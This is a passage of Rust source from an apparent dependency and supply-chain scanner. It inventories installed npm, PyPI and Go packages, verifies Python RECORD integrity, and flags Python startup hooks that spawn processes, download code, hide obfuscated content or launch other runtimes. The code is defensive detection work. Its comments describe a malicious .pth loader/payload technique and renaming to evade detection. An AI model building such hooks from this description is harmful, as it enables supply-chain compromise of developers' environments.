    if let Some(at) = truncated_at {
        notes.push(ScanNote {
            manifest: None,
            note: format!(
                "results truncated at {at} installed entries; pass \
                 `--max-installed-entries 0` to disable the cap (slow)."
            ),
        });
    }

    if declared.is_empty() && manifest_labels.is_empty() {
        notes.push(ScanNote {
            manifest: None,
            note: "no installed-tree packages found under the scan root (looked for \
                   node_modules/, site-packages/, vendor/ for Go modules, and Cargo.lock)."
                .to_string(),
        });
    }

    (manifest_labels, declared)
}

/// Parse one [`DiscoveredManifest`] into `out`, recording a note on any read
/// or parse failure so a partly-broken project still reports.
fn parse_one_manifest(
    manifest: &DiscoveredManifest,
    rel: &str,
    out: &mut Vec<(DeclaredDependency, String)>,
    notes: &mut Vec<ScanNote>,
) {
    let text = match std::fs::read_to_string(&manifest.path) {
        Ok(t) => t,
        Err(e) => {
            notes.push(ScanNote {
                manifest: Some(rel.to_string()),
                note: format!("could not read manifest: {e}"),
            });
            return;
        }
    };
    match parse_manifest(manifest.kind, &text) {
        None => {
            notes.push(ScanNote {
                manifest: Some(rel.to_string()),
                note: format!(
                    "the {} manifest could not be parsed (malformed JSON / TOML) — \
                     its dependencies were not assessed.",
                    manifest.kind.label()
                ),
            });
        }
        Some(deps) => {
            if deps.is_empty() {
                notes.push(ScanNote {
                    manifest: Some(rel.to_string()),
                    note: "the manifest parsed but declares no dependencies.".to_string(),
                });
            }
            for dep in deps {
                out.push((dep, rel.to_string()));
            }
        }
    }
}

/// Walk `node_modules/` for installed npm packages, handling both bare and
/// scoped (`@scope/<pkg>`) layouts.
fn walk_node_modules(
    root: &Path,
    cap: usize,
    declared: &mut Vec<(DeclaredDependency, String)>,
    manifest_labels: &mut Vec<String>,
    truncated_at: &mut Option<usize>,
    label_for: &dyn Fn(&Path) -> String,
) {
    let mut entries: Vec<PathBuf> = std::fs::read_dir(root)
        .map(|rd| {
            rd.filter_map(Result::ok)
                .map(|e| e.path())
                .filter(|p| p.is_dir())
                .collect()
        })
        .unwrap_or_default();
    entries.sort();
    for entry in entries {
        if truncated_at.is_some() {
            return;
        }
        let dir_name = match entry.file_name().and_then(|n| n.to_str()) {
            Some(n) => n,
            None => continue,
        };
        if dir_name == ".bin" || dir_name == ".cache" {
            continue;
        }
        if dir_name.starts_with('@') {
            // Scoped: recurse one level.
            let mut sub: Vec<PathBuf> = std::fs::read_dir(&entry)
                .map(|rd| {
                    rd.filter_map(Result::ok)
                        .map(|e| e.path())
                        .filter(|p| p.is_dir())
                        .collect()
                })
                .unwrap_or_default();
            sub.sort();
            for s in sub {
                if truncated_at.is_some() {
                    return;
                }
                read_node_package(&s, cap, declared, manifest_labels, truncated_at, label_for);
            }
        } else {
            read_node_package(
                &entry,
                cap,
                declared,
                manifest_labels,
                truncated_at,
                label_for,
            );
        }
    }
}

/// Read one installed npm package's `package.json` and emit a single
/// [`DeclaredDependency`] for that package (NOT its sub-dependencies — each
/// installed package is itself one entry).
fn read_node_package(
    pkg_dir: &Path,
    cap: usize,
    declared: &mut Vec<(DeclaredDependency, String)>,
    manifest_labels: &mut Vec<String>,
    truncated_at: &mut Option<usize>,
    label_for: &dyn Fn(&Path) -> String,
) {
    if declared.len() >= cap {
        *truncated_at = Some(cap);
        return;
    }
    let manifest = pkg_dir.join("package.json");
    if !manifest.is_file() {
        return;
    }
    let Ok(text) = std::fs::read_to_string(&manifest) else {
        return;
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(&text) else {
        return;
    };
    let name = json
        .get("name")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty() && is_plausible_package_name(s));
    let Some(name) = name else { return };
    let version = json
        .get("version")
        .and_then(|v| v.as_str())
        .map(str::to_string)
        .filter(|s| !s.is_empty());
    let label = label_for(&manifest);
    manifest_labels.push(label.clone());
    declared.push((
        DeclaredDependency {
            name: name.to_string(),
            ecosystem: Ecosystem::Npm,
            // An installed package reports its own concrete version.
            version: lock_version_intent(version),
            dev: false,
        },
        label,
    ));
}

/// Find `site-packages` directories under `root` (well-defined venv layouts,
/// so the walk is not bounded further).
fn find_site_packages_dirs(root: &Path) -> Vec<PathBuf> {
    let mut found: Vec<PathBuf> = Vec::new();
    // <root>/site-packages and the Windows-venv <root>/Lib/site-packages.
    let candidates: Vec<PathBuf> = vec![
        root.join("site-packages"),
        root.join("Lib").join("site-packages"),
    ];
    for c in candidates {
        if c.is_dir() {
            found.push(c);
        }
    }
    // <root>/lib/python*/site-packages
    let lib = root.join("lib");
    if lib.is_dir() {
        if let Ok(rd) = std::fs::read_dir(&lib) {
            let mut subs: Vec<PathBuf> = rd
                .filter_map(Result::ok)
                .map(|e| e.path())
                .filter(|p| {
                    p.is_dir()
                        && p.file_name()
                            .and_then(|n| n.to_str())
                            .is_some_and(|n| n.starts_with("python"))
                })
                .collect();
            subs.sort();
            for s in subs {
                let sp = s.join("site-packages");
                if sp.is_dir() {
                    found.push(sp);
                }
            }
        }
    }
    found
}

/// Walk a `site-packages` directory for `*.dist-info/METADATA` entries.
fn walk_site_packages(
    root: &Path,
    cap: usize,
    declared: &mut Vec<(DeclaredDependency, String)>,
    manifest_labels: &mut Vec<String>,
    truncated_at: &mut Option<usize>,
    label_for: &dyn Fn(&Path) -> String,
) {
    let mut entries: Vec<PathBuf> = std::fs::read_dir(root)
        .map(|rd| {
            rd.filter_map(Result::ok)
                .map(|e| e.path())
                .filter(|p| {
                    p.is_dir()
                        && p.file_name()
                            .and_then(|n| n.to_str())
                            .is_some_and(|n| n.ends_with(".dist-info"))
                })
                .collect()
        })
        .unwrap_or_default();
    entries.sort();
    for dist_info in entries {
        if truncated_at.is_some() {
            return;
        }
        if declared.len() >= cap {
            *truncated_at = Some(cap);
            return;
        }
        let metadata = dist_info.join("METADATA");
        if !metadata.is_file() {
            continue;
        }
        let Some((name, version)) = read_dist_info_metadata(&metadata) else {
            continue;
        };
        let label = label_for(&metadata);
        manifest_labels.push(label.clone());
        declared.push((
            DeclaredDependency {
                name,
                ecosystem: Ecosystem::PyPI,
                // An installed distribution reports its own concrete version.
                version: lock_version_intent(version),
                dev: false,
            },
            label,
        ));
    }
}

/// Parse a PEP 566 METADATA file's `Name:` and `Version:` headers, reusing the
/// shared header loop in [`crate::artifact::wheel::parse_metadata_headers`] so the
/// installed-tree scan and the artifact parsers cannot drift on what a
/// name/version is. The extra `is_plausible_package_name` gate is specific to the
/// scan (it filters a junk `Name:` out of the dependency list); a name that fails
/// it is dropped here, yielding `None`.
fn read_dist_info_metadata(path: &Path) -> Option<(String, Option<String>)> {
    // No-follow, like every other `.dist-info` read: a planted METADATA symlink must
    // not be followed out of the environment (std::fs::read_to_string follows links).
    let bytes = crate::util::read_text_no_follow_capped(path, 4 * 1024 * 1024).ok()?;
    let text = String::from_utf8(bytes).ok()?;
    let (name, version) = crate::artifact::wheel::parse_metadata_headers(&text)?;
    if !is_plausible_package_name(&name) {
        return None;
    }
    Some((name, version))
}

// ---------------------------------------------------------------------------
// B5 installed-distribution integrity
// ---------------------------------------------------------------------------

/// One normalized installed path owned by two or more distributions, for the
/// serialized report. The cross-distribution loader/payload split surfaces as a
/// duplicate-ownership here.
#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct DuplicateOwnership {
    /// The normalized installed path both distributions claim.
    pub path: String,
    /// The names of the distributions that both list `path` in their RECORD.
    pub owners: Vec<String>,
}

/// B5 installed-distribution integrity over one or more `site-packages` roots.
/// Carries the per-root coverage and the granular integrity signals; the
/// correlation into the single user-facing
/// [`RuleId::PythonInstalledIntegrityViolation`] finding is
/// [`InstalledIntegrityReport::correlated_findings`]. Serialized onto
/// [`EcosystemScanReport`] only in `--installed` mode.
#[derive(Debug, Clone, Default, Serialize)]
pub struct InstalledIntegrityReport {
    /// The `site-packages` roots that were scanned (root-relative-ish display
    /// strings).
    pub site_packages_roots: Vec<String>,
    /// How many installed distributions had their RECORD verified.
    pub distributions_checked: usize,
    /// How many distributions had NO RECORD (a coverage gap, not a violation).
    pub records_missing: usize,
    /// How many RECORD-listed files did not match their on-disk bytes.
    pub hash_mismatches: usize,
    /// Paths owned by more than one distribution (the duplicate-ownership / cross-
    /// distribution split).
    pub duplicate_owned_paths: Vec<DuplicateOwnership>,
    /// `sitecustomize.py`/`usercustomize.py` files present at a site root but
    /// owned by no installed distribution's RECORD (an unowned startup hook: the
    /// strongest B5 corroborator).
    pub unowned_startup_hooks: Vec<String>,
    /// Startup-execution inventory present at a site root (`.pth`/`.start`/
    /// `.egg-link`). INVENTORY only in B5: these are recorded for the B6 startup
    /// analyzer and are NOT a standalone finding here.
    pub startup_inventory: Vec<String>,
    /// Every granular signal collected (RECORD mismatch, duplicate-owned,
    /// sitecustomize-unowned), the evidence the correlation lists.
    pub signals: Vec<crate::artifact::ArtifactSignal>,
    /// B6: the granular startup-hook EXECUTION signals collected while reading the
    /// inventoried `.pth`/`.start`/`sitecustomize.py`/`usercustomize.py` bodies (an
    /// executing non-template line, a subprocess spawn, a network download, a
    /// `sys.path` search, obfuscated content, or an untrusted path addition).
    /// Correlated into the two startup-hook findings, kept separate from the B5
    /// integrity `signals` so the two correlations do not interfere.
    pub startup_signals: Vec<crate::artifact::ArtifactSignal>,
    /// B6: the execution edges discovered from startup hooks (a hook imports a
    /// module / launches a runtime). Carried for the JSON report and the
    /// cross-runtime correlation.
    pub startup_execution_edges: Vec<crate::artifact::ExecutionEdge>,
    /// B6: `true` when at least one inventoried startup hook launches a different
    /// language runtime (Bun/Node/Deno) at interpreter start, the Critical
    /// cross-runtime case.
    pub startup_cross_runtime: bool,
}

impl InstalledIntegrityReport {
    /// Whether any integrity SIGNAL was recorded (a missing RECORD on its own is
    /// not a signal: it is a coverage gap counted in `records_missing`).
    fn has_signal(&self) -> bool {
        !self.signals.is_empty()
    }

    /// Correlate the granular signals into AT MOST ONE user-facing
    /// [`RuleId::PythonInstalledIntegrityViolation`] finding (cross-cutting
    /// invariant 1: few user-facing findings, detail carried as signals). Returns
    /// an empty vec when there is no signal.
    ///
    /// Severity is Medium by default (installed-environment drift is common). It
    /// rises to High ONLY with corroboration B5 can establish: an UNOWNED startup
    /// hook (`sitecustomize.py`/`usercustomize.py` owned by no distribution),
    /// which the plan lists as a High corroborator. A strict integrity policy
    /// further upgrades the ACTION to Block via `action_overrides`, applied by
    /// `finalize_static_verdict`; this function does not itself force Block.
    fn correlated_findings(&self, _policy: &crate::policy::Policy) -> Vec<Finding> {
        if !self.has_signal() {
            return Vec::new();
        }

        // Corroboration: an unowned startup hook elevates the default Medium to
        // High (a hook that executes at every interpreter start and belongs to no
        // package is the serious case; a bare RECORD mismatch in a possibly
        // conda/distro/editable tree is not, by itself).
        let corroborated = !self.unowned_startup_hooks.is_empty();
        let severity = if corroborated {
            Severity::High
        } else {
            Severity::Medium
        };

        // Build a compact evidence list from the distinct signal kinds, plus the
        // concrete offending items, so the single finding names what it correlated.
        let mut evidence: Vec<Evidence> = Vec::new();
        let kinds = self.distinct_signal_kinds();
        evidence.push(Evidence::Text {
            detail: format!("correlated integrity signals: {}", kinds.join(", ")),
        });
        for hook in &self.unowned_startup_hooks {
            evidence.push(Evidence::Text {
                detail: format!("unowned startup hook: {hook}"),
            });
        }
        for dup in &self.duplicate_owned_paths {
            evidence.push(Evidence::Text {
                detail: format!(
                    "path '{}' owned by multiple distributions: {}",
                    dup.path,
                    dup.owners.join(", ")
                ),
            });
        }
        if self.hash_mismatches > 0 {
            evidence.push(Evidence::Text {
                detail: format!(
                    "{} RECORD hash mismatch(es) against on-disk bytes",
                    self.hash_mismatches
                ),
            });
        }

        let title = if corroborated {
            "Installed Python environment integrity violation (unowned startup hook)".to_string()
        } else {
            "Installed Python environment integrity violation".to_string()
        };
        let description = format!(
            "The installed environment failed an integrity check: {}. Installed-environment \
             drift is common (conda, distro packaging, build instrumentation, editable \
             installs), so this is Medium by default and only rises with corroboration such \
             as an unowned startup hook. Review the named files and reinstall affected \
             distributions from a trusted source; set a strict integrity policy \
             (action_overrides) to block on this.",
            kinds.join(", ")
        );

        vec![Finding {
            rule_id: RuleId::PythonInstalledIntegrityViolation,
            severity,
            title,
            description,
            evidence,
            human_view: None,
            agent_view: None,
            mitre_id: None,
            custom_rule_id: None,
        }]
    }

    /// The distinct signal-kind wire strings present, sorted, for the evidence
    /// summary.
    fn distinct_signal_kinds(&self) -> Vec<String> {
        let mut kinds: BTreeSet<String> = BTreeSet::new();
        for s in &self.signals {
            // The signal kind serializes to its snake_case name.
            if let Ok(serde_json::Value::String(k)) = serde_json::to_value(s.kind) {
                kinds.insert(k);
            }
        }
        kinds.into_iter().collect()
    }

    /// B6: correlate the granular startup-hook signals into AT MOST ONE
    /// [`RuleId::PythonStartupHookSuspicious`] (High) AND/OR AT MOST ONE
    /// [`RuleId::PythonStartupHookCrossRuntime`] (Critical) finding (cross-cutting
    /// invariant 1). Returns an empty vec when no startup signal was recorded.
    ///
    /// Suspicious (High -> Block) requires an EXECUTING, non-template hook line
    /// (`PthExecutableLine`) paired with a danger capability or untrusted path:
    /// a subprocess spawn, a network download, a `sys.path` search, obfuscated
    /// content, or an untrusted path addition. A bare path addition with no
    /// executing line is reported in the JSON inventory but is not, on its own,
    /// promoted to a Block here (it is a lower-confidence signal).
    ///
    /// Cross-runtime (Critical -> Block) fires when a startup hook launches a
    /// different language runtime (Bun/Node/Deno), keyed on the launched RUNTIME
    /// name, not the payload filename, so a rename does not evade.
    fn startup_correlated_findings(&self) -> Vec<Finding> {
        if self.startup_signals.is_empty() {
            return Vec::new();
        }

        let mut findings: Vec<Finding> = Vec::new();
        let kinds: BTreeSet<crate::artifact::ArtifactSignalKind> =
            self.startup_signals.iter().map(|s| s.kind).collect();
        use crate::artifact::ArtifactSignalKind as K;

        // A startup hook must actually EXECUTE for the suspicious finding: a
        // `PthExecutableLine` (or a malformed import-prefixed line) is the proof of
        // execution. A `PthUntrustedPathAddition` alone (a non-executing path-add)
        // is recorded but does not by itself promote to Block.
        let has_executing_line = kinds.contains(&K::PthExecutableLine);
        // Danger is the SINGLE definition in `BodyCapabilities::has_danger()`
        // (subprocess / network / dynamic-code / cross-runtime). Reconstruct the
        // capabilities the recorded signal kinds imply and ask that one method, so
        // this correlation cannot drift from the analyzer's definition (T3.16/T2.11).
        // `sys.path` manipulation (`PthSysPathSearch`) and an untrusted path
        // addition (`PthUntrustedPathAddition`) are EVIDENCE only: they stay in the
        // signal stream but do not, on their own, satisfy the danger precondition,
        // so a legitimate `sitecustomize` doing `sys.path.insert(...)` is not
        // promoted to Block. (Cross-runtime is handled by its own Critical path
        // below; dynamic-code has no standalone signal kind in this correlation.)
        let body_caps = crate::artifact::pth::BodyCapabilities {
            subprocess: kinds.contains(&K::PthSubprocessSpawn),
            network: kinds.contains(&K::PthNetworkDownload),
            sys_path_search: kinds.contains(&K::PthSysPathSearch),
            obfuscated: kinds.contains(&K::StartupHookObfuscated),
            ..Default::default()
        };
        let has_danger = body_caps.has_danger();

        if has_executing_line && has_danger {
            let kind_list = startup_distinct_kind_strings(&self.startup_signals);
            let mut evidence: Vec<Evidence> = Vec::new();
            evidence.push(Evidence::Text {
                detail: format!("correlated startup-hook signals: {}", kind_list.join(", ")),
            });
            // List the concrete offending lines (the executable-line + untrusted
            // path-add signals carry the offending text in their evidence).
            for s in &self.startup_signals {
                if matches!(s.kind, K::PthExecutableLine | K::PthUntrustedPathAddition) {
                    evidence.push(Evidence::Text {
                        detail: s.evidence.clone(),
                    });
                }
            }
            findings.push(Finding {
                rule_id: RuleId::PythonStartupHookSuspicious,
                severity: Severity::High,
                title: "A Python startup hook executes suspicious code at interpreter start"
                    .to_string(),
                description: "An installed startup hook (a .pth import line, a Python 3.15 .start \
                     entry-point file, or a sitecustomize.py/usercustomize.py) executes \
                     suspicious code at every interpreter start. The body pairs an executing, \
                     non-template line with a danger capability (a subprocess spawn, a network \
                     download, a sys.path search, obfuscated content, or an untrusted path \
                     addition). Canonical editable-install and namespace-package bootstraps are \
                     exempt because their complete line matches a known template. Review the named \
                     hook and reinstall its owning distribution from a trusted source."
                    .to_string(),
                evidence,
                human_view: None,
                agent_view: None,
                mitre_id: Some("T1546".to_string()),
                custom_rule_id: None,
            });
        }

        // Cross-runtime: keyed on the recorded flag (set when a hook launches a
        // foreign runtime). This is the Critical case and is independent of the
        // suspicious finding (both can fire; the action is Block either way).
        if self.startup_cross_runtime {
            let mut evidence: Vec<Evidence> = Vec::new();
            evidence.push(Evidence::Text {
                detail: "a startup hook launches a different language runtime \
                         (Bun/Node/Deno) at interpreter start"
                    .to_string(),
            });
            for edge in &self.startup_execution_edges {
                if matches!(
                    edge.trigger,
                    crate::artifact::ExecutionTrigger::CrossRuntimeInvocation
                ) {
                    evidence.push(Evidence::Text {
                        detail: format!("{} -> {} ({})", edge.from, edge.to, edge.mechanism),
                    });
                }
            }
            findings.push(Finding {
                rule_id: RuleId::PythonStartupHookCrossRuntime,
                severity: Severity::Critical,
                title: "A Python startup hook launches a different language runtime".to_string(),
                description:
                    "An installed Python startup hook launches a separate language runtime \
                     (Bun, Node, Deno, npm, or npx) at interpreter start. This is the \
                     cross-distribution \
                     loader/payload split used by the live supply-chain campaign, where a Python \
                     .pth hands execution to a bundled JavaScript payload. The detection keys on \
                     the launched runtime name, not the payload filename, so renaming the script \
                     does not evade it. Treat this as an incident: isolate the environment, rotate \
                     reachable credentials, and reinstall affected distributions from a trusted \
                     source after confirming the upstream artifact is clean."
                        .to_string(),
                evidence,
                human_view: None,
                agent_view: None,
                mitre_id: Some("T1546".to_string()),
                custom_rule_id: None,
            });
        }

        findings
    }
}

/// The distinct startup-signal-kind wire strings present, sorted, for evidence.
fn startup_distinct_kind_strings(signals: &[crate::artifact::ArtifactSignal]) -> Vec<String> {
    let mut kinds: BTreeSet<String> = BTreeSet::new();
    for s in signals {
        if let Ok(serde_json::Value::String(k)) = serde_json::to_value(s.kind) {
            kinds.insert(k);
        }
    }
    kinds.into_iter().collect()
}

/// Run the B5 installed-integrity pass over every `site-packages` root under
/// `root`. For each root it builds a duplicate-aware ownership index across all
/// distributions, verifies each distribution's RECORD leniently, and scans the
/// root for unowned `sitecustomize.py`/`usercustomize.py` startup hooks (plus
/// inventories `.pth`/`.start`/`.egg-link` for the later B6 analyzer). Never
/// follows a symlinked final component when reading a file. Best-effort: an
/// unreadable directory contributes nothing rather than failing the scan.
fn collect_installed_integrity(root: &Path) -> InstalledIntegrityReport {
    use crate::artifact::record::{
        index_distribution_ownership, verify_installed_record, EnvironmentLayout, FileVerification,
        OwnershipIndex,
    };
    use crate::artifact::{ArtifactSignal, ArtifactSignalKind, EdgeConfidence};
    use crate::location::SubjectLocation;

    let mut report = InstalledIntegrityReport::default();

    for site in find_site_packages_dirs(root) {
        report.site_packages_roots.push(site.display().to_string());
        let layout = EnvironmentLayout::for_site_packages(site.clone());

        // Discover every `.dist-info` in this root and its distribution identity.
        let dist_infos = discover_dist_infos(&site);

        // 1. Ownership index across ALL distributions in this root (duplicate
        //    ownership is what we detect, so it must be cross-distribution).
        let mut index = OwnershipIndex::new();
        for (dist_info, identity) in &dist_infos {
            index_distribution_ownership(dist_info, identity, &mut index);
        }

        // 2. Per-distribution lenient RECORD verification.
        for (dist_info, identity) in &dist_infos {
            let result = verify_installed_record(dist_info, &layout, identity, false);
            report.distributions_checked += 1;
            if result.record_missing {
                report.records_missing += 1;
            }
            for entry in &result.entries {
                if matches!(entry.verification, FileVerification::Mismatch { .. }) {
                    report.hash_mismatches += 1;
                }
            }
            report.signals.extend(result.signals);
        }

        // 3. Duplicate-owned paths -> a signal each.
        for (path, owners) in index.duplicates() {
            let owner_names: Vec<String> = owners.iter().map(|d| d.name.clone()).collect();
            report.duplicate_owned_paths.push(DuplicateOwnership {
                path: path.as_str().to_string(),
                owners: owner_names.clone(),
            });
            report.signals.push(ArtifactSignal {
                kind: ArtifactSignalKind::DuplicateOwnedFile,
                location: SubjectLocation::installed(site.join(path.as_str())),
                evidence: format!(
                    "installed path '{}' is owned by multiple distributions: {}",
                    path,
                    owner_names.join(", ")
                ),
                confidence: EdgeConfidence::Medium,
            });
        }

        // 4. Scan the site root for startup hooks. `sitecustomize.py` /
        //    `usercustomize.py` owned by NO distribution is a corroborating
        //    signal; `.pth`/`.start`/`.egg-link` are INVENTORY (for B6), not a
        //    finding here.
        scan_site_root_startup(&site, &index, &mut report);
    }

    report
}

/// Discover every `<name>-<version>.dist-info` directory in a `site-packages`
/// root, returning each with its `DistributionIdentity` (read from METADATA).
fn discover_dist_infos(site: &Path) -> Vec<(PathBuf, crate::artifact::DistributionIdentity)> {
    use crate::artifact::DistributionIdentity;
    use crate::location::SubjectLocation;

    let mut out: Vec<(PathBuf, DistributionIdentity)> = Vec::new();
    let Ok(rd) = std::fs::read_dir(site) else {
        return out;
    };
    let mut dist_infos: Vec<PathBuf> = rd
        .filter_map(Result::ok)
        .map(|e| e.path())
        .filter(|p| {
            p.is_dir()
                && p.file_name()
                    .and_then(|n| n.to_str())
                    .is_some_and(|n| n.ends_with(".dist-info"))
        })
        .collect();
    dist_infos.sort();
    for dist_info in dist_infos {
        let metadata = dist_info.join("METADATA");
        let (name, version) = match read_dist_info_metadata(&metadata) {
            Some(nv) => nv,
            // Fall back to the directory name when METADATA is unreadable, so the
            // distribution still participates in ownership/duplicate detection.
            None => match dist_info_dir_identity(&dist_info) {
                Some(nv) => nv,
                None => continue,
            },
        };
        out.push((
            dist_info.clone(),
            DistributionIdentity {
                ecosystem: Ecosystem::PyPI,
                name,
                version,
                dist_info_path: SubjectLocation::installed(dist_info),
            },
        ));
    }
    out
}

/// Parse `<name>-<version>.dist-info` -> `(name, Some(version))` from the
/// directory name, a fallback identity when METADATA is unreadable.
fn dist_info_dir_identity(dist_info: &Path) -> Option<(String, Option<String>)> {
    let dir = dist_info.file_name()?.to_str()?;
    let stem = dir.strip_suffix(".dist-info")?;
    let idx = stem.rfind('-')?;
    let (name, version) = stem.split_at(idx);
    let version = &version[1..];
    if name.is_empty() || version.is_empty() {
        return None;
    }
    Some((name.to_string(), Some(version.to_string())))
}

/// The maximum startup-hook body size read for execution analysis. A `.pth` /
/// `.start` / `sitecustomize.py` is tiny in practice (bytes to a few KiB); cap at
/// 1 MiB so a pathological file cannot drive an unbounded read. A body over the
/// cap is left in the inventory but not body-analyzed.
const MAX_STARTUP_HOOK_BYTES: u64 = 1024 * 1024;

/// Scan a `site-packages` root (top level only) for startup-execution files. An
/// unowned `sitecustomize.py`/`usercustomize.py` emits a `SitecustomizeUnowned`
/// signal AND is recorded in `unowned_startup_hooks`; `.pth`/`.start`/`.egg-link`
/// are recorded in `startup_inventory`. B6: the `.pth`/`.start` and
/// `sitecustomize.py`/`usercustomize.py` BODIES are then read (no-follow, capped)
/// and analyzed for execution content via [`crate::artifact::pth::analyze_body`],
/// folding the granular startup signals / execution edges / cross-runtime flag
/// into `report` for the two startup-hook correlations.
fn scan_site_root_startup(
    site: &Path,
    index: &crate::artifact::record::OwnershipIndex,
    report: &mut InstalledIntegrityReport,
) {
    use crate::artifact::record::NormalizedInstalledPath;
    use crate::artifact::{ArtifactSignal, ArtifactSignalKind, EdgeConfidence};
    use crate::location::SubjectLocation;

    let Ok(rd) = std::fs::read_dir(site) else {
        return;
    };
    let mut names: Vec<(String, PathBuf)> = rd
        .filter_map(Result::ok)
        .filter_map(|e| {
            let p = e.path();
            let n = p.file_name()?.to_str()?.to_string();
            Some((n, p))
        })
        .collect();
    names.sort();

    for (name, path) in names {
        let lower = name.to_ascii_lowercase();
        if lower == "sitecustomize.py" || lower == "usercustomize.py" {
            // Owned by a distribution? Probe ownership under BOTH the site-relative
            // filename and the file's absolute path: a conda/system RECORD may list
            // sitecustomize.py with an absolute path, so a bare-filename probe alone
            // would miss it and raise a false SitecustomizeUnowned (Block) on a hook
            // that is legitimately owned.
            let key = NormalizedInstalledPath::new(&name);
            let abs_key = NormalizedInstalledPath::new(&path.to_string_lossy());
            if !index.is_owned(&key) && !index.is_owned(&abs_key) {
                report
                    .unowned_startup_hooks
                    .push(path.display().to_string());
                report.signals.push(ArtifactSignal {
                    kind: ArtifactSignalKind::SitecustomizeUnowned,
                    location: SubjectLocation::installed(path.clone()),
                    evidence: format!(
                        "{name} present at the site-packages root but owned by no installed \
                         distribution (executes at interpreter start)"
                    ),
                    confidence: EdgeConfidence::High,
                });
            }
            // B6: analyze the sitecustomize/usercustomize MODULE body for execution
            // content regardless of ownership (an OWNED but hostile hook still
            // executes; ownership is a B5 corroborator, not an exemption here).
            analyze_startup_hook_body(
                &path,
                crate::artifact::pth::StartupHookKind::SiteCustomize,
                report,
            );
        } else if lower.ends_with(".pth") || lower.ends_with(".start") {
            // Inventory + B6 body analysis (the executing-content surface).
            report.startup_inventory.push(path.display().to_string());
            let kind = if lower.ends_with(".start") {
                crate::artifact::pth::StartupHookKind::Start
            } else {
                crate::artifact::pth::StartupHookKind::Pth
            };
            analyze_startup_hook_body(&path, kind, report);
        } else if lower.ends_with(".egg-link") {
            // `.egg-link` points at a project dir (one path per line); it is an
            // editable-install pointer, not executable startup code. Inventory only.
            report.startup_inventory.push(path.display().to_string());
        }
    }
}

/// Read one startup-hook body (no-follow, capped) and fold its B6 execution
/// analysis into `report`: the granular startup signals, the execution edges
/// (including a cross-runtime edge when a foreign runtime is launched), and the
/// cross-runtime flag. A body that is unreadable or over [`MAX_STARTUP_HOOK_BYTES`]
/// contributes nothing (best-effort; the inventory still records the file).
fn analyze_startup_hook_body(
    path: &Path,
    kind: crate::artifact::pth::StartupHookKind,
    report: &mut InstalledIntegrityReport,
) {
    use crate::artifact::{
        ArtifactSignal, ArtifactSignalKind, EdgeConfidence, ExecutionEdge, ExecutionTrigger,
    };
    use crate::location::SubjectLocation;
    use crate::util::OpenRegularError;

    let bytes = match crate::util::read_text_no_follow_capped(path, MAX_STARTUP_HOOK_BYTES) {
        Ok(bytes) => bytes,
        // A vanished file (a race between the directory walk and the read) is a
        // benign coverage gap with no hook left to inspect: stay silent.
        Err(OpenRegularError::NotFound) => return,
        // A read that was REFUSED (a symlinked / non-regular final component that
        // O_NOFOLLOW would not open, a body over the size cap, or a permission /
        // I/O error) leaves an inventoried startup hook UNINSPECTED. Do not treat
        // it as clean: record a Low-confidence "uninspectable startup hook" signal
        // so the coverage gap is visible. This does not on its own promote to a
        // Block (it is not a danger leg in `startup_correlated_findings`), but a
        // planted symlink or a deliberately unreadable hook is no longer silent.
        Err(err) => {
            let reason = match err {
                OpenRegularError::NotRegularFile => {
                    "a symlinked or non-regular final component (read refused, not followed)"
                }
                OpenRegularError::TooLarge => "the body exceeds the inspection size cap",
                OpenRegularError::Io(_) => "a permission or I/O error",
                OpenRegularError::NotFound => unreachable!("NotFound handled above"),
            };
            report.startup_signals.push(ArtifactSignal {
                kind: ArtifactSignalKind::StartupHookUninspectable,
                location: SubjectLocation::installed(path.to_path_buf()),
                evidence: format!(
                    "{} startup hook could not be inspected ({reason}); its content is unknown, \
                     not known-clean",
                    kind.label()
                ),
                confidence: EdgeConfidence::Low,
            });
            return;
        }
    };
    // A startup hook is text; decode lossily so a stray non-UTF-8 byte does not
    // drop the whole body (the analyzer is substring-based and tolerates it).
    let body = String::from_utf8_lossy(&bytes);
    let loc = SubjectLocation::installed(path.to_path_buf());
    let analysis = crate::artifact::pth::analyze_body(&body, &loc, kind);

    report.startup_signals.extend(analysis.signals);

    // A plain bootstrap import emits an execution edge (startup hook imports a
    // module, which runs its top-level code). The owning distribution is not
    // resolved here (that is B5's ownership index / B8's cross-artifact pass); the
    // edge records the hook -> module relationship with the module text.
    if analysis.capabilities.cross_runtime {
        report.startup_cross_runtime = true;
        report.startup_execution_edges.push(ExecutionEdge {
            from: loc.clone(),
            trigger: ExecutionTrigger::CrossRuntimeInvocation,
            to: SubjectLocation::default(),
            mechanism: "startup hook launches a foreign language runtime (Bun/Node/Deno)"
                .to_string(),
            confidence: crate::artifact::EdgeConfidence::High,
        });
    }
    // Emit a generic import edge for each executing bootstrap line (the
    // "startup hook imports module" relationship the plan calls for), so the JSON
    // report carries the edge even when no cross-runtime launch is present.
    for line in &analysis.lines {
        if line.class.executes() {
            report.startup_execution_edges.push(ExecutionEdge {
                from: loc.clone(),
                trigger: kind.trigger(),
                to: SubjectLocation::default(),
                mechanism: format!("startup line imports/executes: {}", line.text.trim()),
                confidence: crate::artifact::EdgeConfidence::Medium,
            });
        }
    }
}

/// Walk `vendor/` for vendored Go modules (`host/owner/repo`-shaped names).
fn walk_vendor_go(
    root: &Path,
    cap: usize,
    declared: &mut Vec<(DeclaredDependency, String)>,
    manifest_labels: &mut Vec<String>,
    truncated_at: &mut Option<usize>,
    label_for: &dyn Fn(&Path) -> String,
) {
    // Prefer the authoritative `modules.txt` when present; otherwise treat any
    // dir three deep under `vendor/` as a candidate module.
    let modules_txt = root.join("modules.txt");
    if modules_txt.is_file() {
        let text = std::fs::read_to_string(&modules_txt).unwrap_or_default();
        let label = label_for(&modules_txt);
        manifest_labels.push(label.clone());
        for line in text.lines() {
            let trimmed = line.trim();
            // `# host/owner/mod v1.2.3` is a module header line.
            let Some(rest) = trimmed.strip_prefix("# ") else {
                continue;
            };
            let mut parts = rest.split_whitespace();
            let Some(module) = parts.next() else { continue };
            if module.is_empty() || !is_plausible_package_name(module) {
                continue;
            }
            let version = parts.next().map(str::to_string);
            if declared.len() >= cap {
                *truncated_at = Some(cap);
                return;
            }
            declared.push((
                DeclaredDependency {
                    name: module.to_string(),
                    ecosystem: Ecosystem::Go,
                    // `modules.txt` records the concrete resolved module version.
                    version: lock_version_intent(version),
                    dev: false,
                },
                label.clone(),
            ));
        }
        return;
    }
    // Fallback: walk depth-3 directories under `vendor/`.
